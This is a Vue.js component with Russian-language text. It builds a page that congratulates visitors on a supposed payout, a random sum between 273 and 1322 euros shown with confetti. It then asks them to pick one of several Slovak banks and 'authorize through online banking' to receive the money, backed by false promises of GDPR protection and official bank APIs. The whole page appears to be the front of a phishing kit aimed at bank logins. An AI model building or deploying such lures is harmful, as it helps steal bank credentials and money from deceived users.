<template>
  <div class="congratulations-container">
    <vue-confetti
      v-if="showConfetti"
      :angle="90"
      :spread="60"
      :startVelocity="30"
      :dragFriction="0.1"
      :duration="3000"
      :particleCount="200" />
    <div class="content-wrapper">
      <h4
        style="color: rgba(0, 48, 120, 1); font-size: 2.1rem; font-weight: 600">
        Поздравляем,
      </h4>
      <h4
        style="color: rgba(0, 48, 120, 1); font-size: 2.1rem; font-weight: 600">
        вам положена выплата:
      </h4>
      <h3
        style="font-size: 5rem; color: rgba(177, 6, 6, 1); margin-bottom: 2rem">
        {{ payoutAmount }}€
      </h3>
    </div>
    <div style="background-color: white">
      <div class="content-wrapper">
        <div class="end-container">
          <div class="end-container-left">
            <h3>Получите вашу выплату быстро и безопасно!</h3>
            <h4>
              Чтобы завершить процесс и получить вашу выплату, необходимо пройти
              авторизацию через банкинг. Это нужно для того, чтобы:
            </h4>
            <li>Убедиться, что выплата поступит именно вам.</li>

            <li>Обеспечить мгновенное зачисление средств на ваш счет.</li>
            <li>Соблюсти все требования безопасности и защиты данных.</li>
          </div>
          <div class="end-container-right">
            <img src="../assets/images/Capa_1.png" alt="" />
          </div>
        </div>
      </div>
    </div>
    <div class="content-wrapper">
      <div class="bank">
        <div class="bank-left">
          <h3 style="color: rgba(0, 48, 120, 1)">Как это работает?</h3>
          <h4>1. Выберите ваш банк из списка.</h4>
          <h4>2. Авторизуйтесь через систему онлайн-банкинга.</h4>
          <h4>3. Подтвердите получение выплаты.</h4>
        </div>
        <div class="bank-right">
          <h3>Мы гарантируем:</h3>

          <li>
            Полную конфиденциальность. Ваши данные защищены по стандартам GDPR.
          </li>
          <li>
            Безопасность. Мы используем только официальные API банков, чтобы
            исключить риски.
          </li>
          <li>
            Удобство. Вы получите выплату напрямую на ваш счет без лишних шагов.
          </li>
        </div>
      </div>
      <h4 style="text-align: start; font-weight: 700; margin-bottom: 12px">
        Выберите банк
      </h4>
      <div class="bank-sub">
        <div class="bank-sub-left">
          <button
            :class="['banker', { 'banker-selected': selectedBank === '365' }]"
            @click="selectBank('365')">
            <img src="../assets/images/bank/365.png" alt="" />
          </button>
          <button
            :class="['banker', { 'banker-selected': selectedBank === 'csob' }]"
            @click="selectBank('csob')">
            <img src="../assets/images/bank/csob.png" alt="" />
          </button>
        </div>
        <div class="bank-sub-right">
          <button
            :class="['banker', { 'banker-selected': selectedBank === 'trata' }]"
            @click="selectBank('trata')">
            <img src="../assets/images/bank/trata.png" alt="" />
          </button>
          <button
            :class="[
              'banker',
              { 'banker-selected': selectedBank === 'slovenska' },
            ]"
            @click="selectBank('slovenska')">
            <img src="../assets/images/bank/slovenska.png" alt="" />
          </button>
        </div>
      </div>

      <button
        :class="['banker', { 'banker-selected': selectedBank === 'unicredit' }]"
        @click="selectBank('unicredit')">
        <img
          class="button-bank-img"
          src="../assets/images/bank/unicredit.png"
          alt="" />
      </button>

      <button
        :class="['get-pay', { active: selectedBank }]"
        :disabled="!selectedBank"
        @click="goToPayoutPage">
        <h4>ПОЛУЧИТЬ ВЫПЛАТУ</h4>
      </button>
      <h4 class="sub-button-info">
        Если у вас возникли вопросы, свяжитесь с нашей поддержкой
        gmail@gmail.com
      </h4>
    </div>
  </div>
</template>

<script>
import VueConfetti from "vue-confetti";

export default {
  name: "Congratulations",
  components: {
    VueConfetti,
  },
  data() {
    return {
      payoutAmount: this.getRandomPayout(),
      selectedBank: null,
      showConfetti: false,
    };
  },
  methods: {
    getRandomPayout() {
      return Math.floor(Math.random() * (1322 - 273 + 1)) + 273;
    },
    selectBank(bank) {
      if (this.selectedBank === bank) {
        this.selectedBank = null;
      } else {
        this.selectedBank = bank;
      }
    },
    goToPayoutPage() {
      window.location.href = "https://example.com/payout";
    },
    startConfetti() {
      console.log("Конфетти запускаются...");
      this.showConfetti = true;
      setTimeout(() => {
        this.showConfetti = false;
      }, 4000);
    },
  },
  mounted() {
    setTimeout(() => {
      this.startConfetti();
    }, 1000);
  },
};
</script>

<style scoped>
vue-confetti {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 9999;
}

.content-wrapper {
  padding: 0 20px;
}

.sub-button-info {
  color: rgba(140, 140, 140, 1);
  margin-top: 10px;
  font-weight: 300;
  font-size: 20px;
}

.get-pay {
  width: 100%;
  height: 50px;
  color: white;
  outline: none;
  background-color: rgba(131, 131, 131, 1);
  cursor: not-allowed;
}

.get-pay.active {
  background-color: rgba(0, 112, 60, 1);
  cursor: pointer;
}

.banker {
  width: 100%;
  background-color: white;
  outline: none;
  border: 1px solid rgba(217, 217, 217, 1);
  height: 50px;
  margin-bottom: 10px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.banker img {
}

.banker-selected {
  border: 3px solid rgba(0, 112, 60, 1);
}

.bank-sub-left,
.bank-sub-right {
  width: 50%;
}

.bank-sub {
  display: flex;
  gap: 20px;
}

.bank {
  display: flex;
  text-align: start;
  padding: 20px 0;
}

.bank-left {
  display: flex;
  flex-direction: column;
  gap: 20px;
  width: 50%;
}

.bank-right {
  text-align: start;
  display: flex;
  flex-direction: column;
  gap: 20px;
  width: 50%;
}

.end-container {
  padding: 30px 0;
  display: flex;
}

.end-container-left {
  display: flex;
  flex-direction: column;
  gap: 20px;
  width: 50%;
  text-align: start;
}

.end-container-right {
  display: flex;
  justify-content: center;
  width: 50%;
}

.content-wrapper {
  max-width: 1024px;
  margin: 0 auto;
  width: 100%;
}

.congratulations-container {
  text-align: center;
}

.congratulations-container h3 {
  font-size: 2rem;
  font-weight: bold;
}

.congratulations-container p {
  font-size: 1.6rem;
  color: #333;
}

@media screen and (max-width: 720px) {
  .congratulations-container h4 {
    font-size: 1.8rem;
  }

  .congratulations-container h3 {
    font-size: 3rem;
  }

  h3 {
    font-size: 26px;
  }

  .bank {
    flex-direction: column;
    padding: 20px 0;
  }

  .button-bank-img {
    height: 20px;
    object-fit: none;
  }

  .bank-left,
  .bank-right {
    width: 100%;
    text-align: start;
    margin-top: 40px;
  }

  .end-container {
    flex-direction: column;
    padding: 20px 0;
  }

  .end-container-left,
  .end-container-right {
    width: 100%;
    margin-top: 20px;
    text-align: start;
  }

  .bank-sub {
    flex-direction: column;
    align-items: center;
    gap: 0;
  }

  .bank-sub-left,
  .bank-sub-right {
    width: 100%;
    display: flex;
    justify-content: center;
    gap: 10px;
  }

  .banker {
    height: 40px;
    margin-bottom: 10px;
  }

  .get-pay {
    height: 45px;
  }

  .sub-button-info {
    font-size: 12px;
  }

  .end-container-left h3,
  .end-container-left h4 {
    font-size: 1.4rem;
  }

  .bank-left h3 {
    font-size: 1.6rem;
  }

  .banker img {
    height: 30px;
  }

  .bank-left h3,
  .bank-right h3 {
    font-size: 1.6rem;
  }

  .content-wrapper h4 {
    font-size: 1.4rem;
  }

  .content-wrapper h3 {
    font-size: 2.4rem;
  }
}
</style>
